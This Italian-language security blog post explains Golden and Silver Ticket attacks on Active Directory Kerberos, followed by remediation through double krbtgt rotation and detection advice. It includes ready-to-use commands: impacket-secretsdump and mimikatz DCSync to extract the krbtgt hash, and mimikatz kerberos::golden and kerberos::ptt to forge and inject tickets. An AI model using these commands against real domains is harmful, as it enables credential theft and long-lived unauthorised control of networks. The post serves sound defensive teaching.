---
layout: post
title: "Golden Ticket e Silver Ticket: persistenza avanzata in Active Directory"
date: 2026-08-25
cat: red
tags: [Golden Ticket, Silver Ticket, Kerberos, Active Directory, DCSync, red team]
excerpt: "Chi possiede l'hash del krbtgt possiede il dominio, anche mesi dopo che l'accesso iniziale è stato chiuso. Golden e Silver Ticket sono la forma di persistenza più potente — e più difficile da estirpare — in Active Directory."
---

Kerberoasting e AS-REP Roasting (visti nell'articolo sui vettori base di Active Directory) rubano credenziali esistenti. Golden Ticket e Silver Ticket sono un passo oltre: **forgiano** ticket Kerberos validi da zero, senza mai autenticarsi con credenziali reali — e restano validi finché la chiave usata per firmarli non viene ruotata.

## Come funziona Kerberos, in breve

1. L'utente si autentica presso il KDC (Key Distribution Center, sul Domain Controller) e riceve un **TGT** (Ticket Granting Ticket), cifrato con l'hash dell'account speciale **krbtgt**
2. Il TGT viene presentato per richiedere **TGS** (Service Ticket) per accedere a servizi specifici, cifrati con l'hash dell'account di servizio

Chi conosce l'hash krbtgt può **firmare un TGT arbitrario**, per qualsiasi utente, con qualsiasi appartenenza a gruppi (inclusi Domain Admins) — senza mai passare dal KDC per l'autenticazione.

## Ottenere l'hash krbtgt: DCSync

```bash
# Richiede privilegi di replica AD (tipicamente Domain Admin o delegati)
impacket-secretsdump domain.local/Administrator@10.10.10.1 -just-dc-user krbtgt

# equivalente con mimikatz
# lsadump::dcsync /domain:domain.local /user:krbtgt
```

DCSync simula il comportamento di un Domain Controller che richiede una replica ad un altro — Active Directory è progettato per fidarsi di questa richiesta se proviene da un account con i diritti giusti (`Replicating Directory Changes`, `Replicating Directory Changes All`).

## Golden Ticket — accesso illimitato al dominio

```powershell
mimikatz # kerberos::golden /user:qualsiasi_utente /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash_krbtgt> /ticket:golden.kirbi

mimikatz # kerberos::ptt golden.kirbi
```

Il ticket forgiato può impersonare **qualunque utente**, con **qualunque appartenenza a gruppo**, per **qualunque durata** (di default Kerberos limita il TGT a 10 ore, ma un Golden Ticket può essere forgiato con validità di anni). Anche disabilitando l'account originale usato per ottenere l'hash, il Golden Ticket resta valido.

## Silver Ticket — più silenzioso, più mirato

Un Silver Ticket forgia direttamente un **TGS** per un servizio specifico, usando l'hash dell'account di servizio (non del krbtgt):

```powershell
mimikatz # kerberos::golden /user:qualsiasi_utente /domain:domain.local /sid:S-1-5-21-... /target:fileserver.domain.local /service:cifs /rc4:<hash_account_servizio> /ticket:silver.kirbi
```

Il vantaggio: **non contatta mai il Domain Controller** per la richiesta, quindi non genera i log di autenticazione Kerberos tipici (Event ID 4768/4769). Lo svantaggio per l'attaccante: l'accesso è limitato a quel singolo servizio.

## Perché è così difficile da rimediare

L'unica rimedio reale contro un Golden Ticket è **ruotare l'hash krbtgt due volte** (la doppia rotazione è necessaria per invalidare sia la password corrente che quella precedente, entrambe accettate per compatibilità):

```powershell
# Da eseguire due volte, con un intervallo di propagazione tra le due rotazioni
Set-ADAccountPassword -Identity krbtgt -Reset
```

Se non viene fatto, un attaccante che ha ottenuto l'hash krbtgt mesi prima può tornare in qualsiasi momento con un ticket forgiato al momento, senza dover ripetere l'accesso iniziale né lasciare tracce di autenticazione anomala.

## Detection

- **Event ID 4768** con dati di cifratura incoerenti con la policy del dominio (es. RC4 quando è imposto AES)
- **Ticket con validità anomala** (superiore alle 10 ore standard) o con nomi utente non presenti in AD
- **DCSync da host che non sono Domain Controller** — Event ID 4662 con i GUID delle repliche AD, monitorabile via SIEM
- Strumenti come **Microsoft Defender for Identity** rilevano nativamente i pattern di Golden Ticket e DCSync anomalo

## Conclusione

Golden e Silver Ticket dimostrano perché la protezione dell'hash krbtgt è una priorità assoluta per ogni blue team: non è "un altro account da proteggere" — è la chiave master che rende falsificabile l'intera fiducia del dominio.
